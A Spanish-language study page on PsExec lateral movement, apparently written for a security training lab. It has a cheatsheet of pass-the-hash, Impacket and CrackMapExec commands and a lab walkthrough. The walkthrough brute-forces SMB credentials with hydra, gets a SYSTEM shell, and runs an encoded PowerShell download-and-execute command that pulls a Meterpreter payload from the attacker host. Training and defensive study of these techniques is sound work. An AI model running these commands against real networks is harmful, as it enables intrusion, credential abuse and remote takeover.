
# PsExec Lateral Movement

## <mark style="color:purple;">Introducción</mark>

#### ¿Qué es PsExec?

PsExec es una herramienta legítima del paquete Sysinternals de Microsoft que permite ejecutar procesos de forma remota en sistemas Windows mediante línea de comandos. Su propósito original es facilitar tareas administrativas, pero su diseño y firmas oficiales la convierten en una de las técnicas más abusadas por atacantes para moverse lateralmente dentro de una red.

#### ¿Cómo funciona?

1. **Conexión SMB** (puerto 445) al recurso compartido `ADMIN$` del objetivo.
2. **Subida del agente** (`psexesvc.exe` o nombre aleatorio) a `C:\Windows`.
3. **Creación de un servicio temporal** a través del Service Control Manager (SCM).
4. **Establecimiento de comunicación** mediante tuberías con nombre (*named pipes*) para la entrada/salida interactiva.

#### Requisitos para la explotación:

* Credenciales de un usuario con `privilegios de administrador local` en el objetivo (o hash NTLM para Pass-the-Hash).
* `Puerto 445` (SMB) accesible.
* El servicio `Server` (compartición de archivos) debe estar activo.
* Firewall permitiendo tráfico SMB entrante.

#### Técnicas de ataque comunes:

* **Uso directo con contraseña**.
* **Pass-the-Hash** (usar hash NTLM sin contraseña).
* **Ejecución de comandos únicos o shells interactivas**.
* **Combinación con otras herramientas** (CrackMapExec, Impacket).

***

## <mark style="color:purple;">Cheatsheet</mark>

#### 🔹 Desde Windows (binario nativo de Sysinternals)

<table data-header-hidden><thead><tr><th width="268.66668701171875"></th><th></th></tr></thead><tbody><tr><td>Acción</td><td>Comando</td></tr><tr><td>Shell interactiva</td><td><code>psexec64.exe \\&#x3C;IP> -u &#x3C;USER> -p &#x3C;PASS> -i cmd.exe</code></td></tr><tr><td>Ejecutar comando único</td><td><code>psexec64.exe \\&#x3C;IP> -u &#x3C;USER> -p &#x3C;PASS> cmd.exe /c "whoami > C:\temp\out.txt"</code></td></tr><tr><td>Especificar dominio</td><td><code>psexec64.exe \\&#x3C;IP> -u DOMAIN\\user -p pass -i powershell.exe</code></td></tr><tr><td>Usar hash (requiere mimikatz previo)</td><td><code>psexec64.exe \\&#x3C;IP> -u user -p "" -H &#x3C;hash></code> (no soportado nativamente, mejor Impacket)</td></tr></tbody></table>

#### 🔹 Desde Linux con Impacket (recomendado)

<table data-header-hidden><thead><tr><th width="333.33331298828125"></th><th></th></tr></thead><tbody><tr><td>Acción</td><td>Comando</td></tr><tr><td>Shell con contraseña</td><td><code>impacket-psexec DOMAIN/user:'password'@&#x3C;IP></code></td></tr><tr><td>Shell con hash NTLM (Pass-the-Hash)</td><td><code>impacket-psexec -hashes :&#x3C;HASH_NTLM> DOMAIN/user@&#x3C;IP></code></td></tr><tr><td>Ejecutar comando único</td><td><code>impacket-psexec DOMAIN/user:'password'@&#x3C;IP> whoami</code></td></tr><tr><td>Usar autenticación local (sin dominio)</td><td><code>impacket-psexec user:'password'@&#x3C;IP></code></td></tr></tbody></table>

#### 🔹 Alternativas de Impacket para movimiento lateral

<table data-header-hidden><thead><tr><th width="185.66668701171875"></th><th width="271.6666259765625"></th><th></th></tr></thead><tbody><tr><td>Herramienta</td><td>Descripción</td><td>Comando ejemplo</td></tr><tr><td><code>impacket-smbexec</code></td><td>Similar a PsExec pero sin subir archivo (más sigiloso)</td><td><code>impacket-smbexec DOMAIN/user:'password'@&#x3C;IP></code></td></tr><tr><td><code>impacket-wmiexec</code></td><td>Usa WMI (puerto 135/RPC)</td><td><code>impacket-wmiexec DOMAIN/user:'password'@&#x3C;IP></code></td></tr><tr><td><code>impacket-atexec</code></td><td>Usa tareas programadas (<code>schtasks</code>)</td><td><code>impacket-atexec DOMAIN/user:'password'@&#x3C;IP> 'whoami'</code></td></tr></tbody></table>

#### 🔹 Herramientas automatizadas

<table data-header-hidden><thead><tr><th width="268"></th><th></th></tr></thead><tbody><tr><td>Herramienta</td><td>Comando ejemplo</td></tr><tr><td>CrackMapExec (SMB)</td><td><code>crackmapexec smb &#x3C;IP> -u user -p pass -x 'whoami'</code></td></tr><tr><td>CrackMapExec con hash</td><td><code>crackmapexec smb &#x3C;IP> -u user -H &#x3C;HASH> -x 'whoami'</code></td></tr><tr><td>Evil-WinRM (WinRM, no SMB)</td><td><code>evil-winrm -i &#x3C;IP> -u user -p pass</code></td></tr></tbody></table>

#### 🔹 Comandos auxiliares para movimiento lateral

<table data-header-hidden><thead><tr><th width="289.33331298828125"></th><th></th></tr></thead><tbody><tr><td>Acción</td><td>Comando (Windows nativo)</td></tr><tr><td>Conectar a <code>ADMIN$</code> manualmente</td><td><code>net use \\&#x3C;IP>\ADMIN$ /user:DOMAIN\user password</code></td></tr><tr><td>Copiar archivo a remoto</td><td><code>copy payload.exe \\&#x3C;IP>\ADMIN$\temp\</code></td></tr><tr><td>Crear servicio remoto manual</td><td><code>sc \\&#x3C;IP> create ServiceName binPath= "cmd.exe /c calc" start= auto</code></td></tr><tr><td>Iniciar servicio</td><td><code>sc \\&#x3C;IP> start ServiceName</code></td></tr><tr><td>Eliminar servicio</td><td><code>sc \\&#x3C;IP> delete ServiceName</code></td></tr></tbody></table>

#### 🔹 Pass-the-Hash con otras herramientas

<table data-header-hidden><thead><tr><th width="314"></th><th></th></tr></thead><tbody><tr><td>Herramienta</td><td>Comando</td></tr><tr><td><code>xfreerdp</code> (RDP con hash)</td><td><code>xfreerdp /v:&#x3C;IP> /u:user /pth:&#x3C;HASH_NTLM></code></td></tr><tr><td><code>evil-winrm</code> (WinRM con hash)</td><td><code>evil-winrm -i &#x3C;IP> -u user -H &#x3C;HASH_NTLM></code></td></tr><tr><td><code>net use</code> con hash (requiere mimikatz)</td><td><em>No directo; usar <code>sekurlsa::pth</code> para inyectar token</em></td></tr></tbody></table>

***

### Resumen rápido de comandos esenciales

```bash
# Bruteforce de SMB (Obtener credenciales)
hydra -l administrator -P /usr/share/wordlists/rockyou.txt.gz 10.2.26.45 smb2

# Shell interactiva con PsExec (Impacket)
impacket-psexec administrator:'batman'@10.2.26.45

# Pass-the-Hash
impacket-psexec -hashes :ntlm_hash administrator@10.2.26.45

# Ejecución lateral con SMBExec (sin subir binario)
impacket-smbexec WORKGROUP/adminstrator:'batman'@10.2.26.45

# Ejecución masiva con CrackMapExec
crackmapexec smb 10.2.26.0/24 -u administrator -H ntlm_hash -x 'whoami'
```

***

## <mark style="color:purple;">Lab:</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**SMB Server PSexec II**</mark>

Se le proporciona una máquina Kali GUI y una máquina objetivo que ejecuta un servicio SMB vulnerable. La máquina objetivo es accesible en **`demo.ine.local`**.

Tu tarea consiste en identificar el servicio SMB utilizando las herramientas disponibles en Kali y, posteriormente, usar la herramienta PSexec para realizar una post-explotación en dicho servicio. La herramienta PSexec permite ejecutar comandos directamente en sistemas remotos a través de una tubería con nombre que interactúa con el servicio SMB.

**Objetivo:** ¡Aprovechar el servicio SMB para instalar un Meterpreter en el objetivo y recuperar la flag!

### Hosts

Nuestro objetivo es `demo.ine.local`

```bash
┌──(root㉿attackdefense)-[~]
└─# cat /etc/hosts

127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.12       attackdefense.com attackdefense
127.0.0.1 AttackDefense-Kali
10.10.49.6      attackdefense.com attackdefense
10.2.26.45    demo.ine.local
```

### Escaneo de puertos

```bash
┌──(root㉿attackdefense)-[~]
└─# nmap -sV demo.ine.local

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Vemos que tenemos abierto el puerto 445 SMB, vamos a enumerarlo.

### Escaneo dirigido a SMB

```bash
┌──(root㉿attackdefense)-[~]
└─# nmap -sV -p 445 --script smb-* demo.ine.local

PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)

Host script results:
| smb-mbenum: 
|_  ERROR: Failed to connect to browser service: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-print-text: false
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
| smb-protocols: 
|   dialects: 
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|_    3:1:1
|_smb-flood: ERROR: Script execution failed (use -d to debug)
```

Observamos que en `smb-protocols` tenemos varios disponibles, y no obtenemos nada más de información con los scripts.

### Bruteforce de SMB

{% hint style="info" %}
**Importante**: especificar `smb2` en vez de SMB para que funcione bien el bruteforce
{% endhint %}

```bash
┌──(root㉿attackdefense)-[~]
└─# hydra -l administrator -P /usr/share/wordlists/rockyou.txt.gz 10.2.26.45 smb2
                                      
Hydra v9.6dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-09 23:19:04
[WARNING] Workgroup was not specified, using "WORKGROUP"
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking smb2://10.2.26.45:445/
[WARNING] 10.2.26.45 might accept any credential
[445][smb2] host: 10.2.26.45   login: administrator   password: superman
1 of 1 target successfully completed, 1 valid password found
```

Encontramos la contraseña del administrador: `superman`

### Impacket PSExec

```bash
┌──(root㉿attackdefense)-[~]
└─# impacket-psexec administrator:superman@10.2.26.45

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 10.2.26.45.....
[*] Found writable share admin
[*] Uploading file zgLGohYC.exe
[*] Opening SVCManager on 10.2.26.45.....
[*] Creating service OCHz on 10.2.26.45.....
[*] Starting service OCHz.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Tenemos acceso como administrator, pero vamos a conseguir un mejor acceso con Meterpreter.

### Web Delivery

{% code overflow="wrap" %}

```bash
msfconsole
use exploit/multi/script/web_delivery
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.49.6
set target 2     # Powershell
exploit

[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.49.6:4444 
[*] Using URL: http://10.10.49.6:8080/l9MAtufc5n
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB1ADIATABjAG0APQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAdQAyAEwAYwBtAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAdQAyAEwAYwBtAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4ANAA5AC4ANgA6ADgAMAA4ADAALwBsADkATQBBAHQAdQBmAGMANQBuAC8AdwBUADkANAB4AEwATwBiAEwARABOACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA0ADkALgA2ADoAOAAwADgAMAAvAGwAOQBNAEEAdAB1AGYAYwA1AG4AJwApACkAOwA=
```

{% endcode %}

Ejecutamos el payload generado en la máquina windows y obtenemos la sesión de Meterpreter como SYSTEM:

```bash
[*] 10.2.26.45       web_delivery - Delivering AMSI Bypass (1405 bytes)
[*] 10.2.26.45       web_delivery - Delivering Payload (3530 bytes)
[*] Sending stage (176198 bytes) to 10.2.26.45
[*] Meterpreter session 1 opened (10.10.49.6:4444 -> 10.2.26.45:49842) at 2026-04-09 23:27:26 +0530

msf6 exploit(multi/script/web_delivery) > sessions 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Acceso a la flag

```powershell
meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2020-09-25 12:04:38 +0530  $Recycle.Bin
100666/rw-rw-rw-  1       fil   2016-07-16 18:48:08 +0530  BOOTNXT
040777/rwxrwxrwx  8192    dir   2020-09-09 10:22:55 +0530  Boot
040777/rwxrwxrwx  0       dir   2016-10-18 07:29:39 +0530  Documents and Settings
040777/rwxrwxrwx  0       dir   2018-02-23 16:36:05 +0530  PerfLogs
040555/r-xr-xr-x  4096    dir   2017-12-14 02:30:56 +0530  Program Files
040777/rwxrwxrwx  4096    dir   2020-09-25 12:13:29 +0530  Program Files (x86)
040777/rwxrwxrwx  4096    dir   2016-11-24 05:49:28 +0530  ProgramData
040777/rwxrwxrwx  0       dir   2016-10-18 07:31:27 +0530  Recovery
040777/rwxrwxrwx  0       dir   2020-09-25 11:43:59 +0530  System Volume Information
040555/r-xr-xr-x  4096    dir   2020-09-25 11:45:39 +0530  Users
040777/rwxrwxrwx  28672   dir   2020-09-25 11:44:14 +0530  Windows
040777/rwxrwxrwx  0       dir   2026-04-09 23:21:49 +0530  admin
100444/r--r--r--  388690  fil   2020-09-02 13:52:08 +0530  bootmgr
100666/rw-rw-rw-  32      fil   2020-09-25 22:09:39 +0530  flag.txt
000000/---------  0       fif   1970-01-01 05:30:00 +0530  pagefile.sys
040777/rwxrwxrwx  0       dir   2020-09-25 12:12:16 +0530  public

meterpreter > cat flag.txt 
cce492688e30ea1eeaaa637d********
```
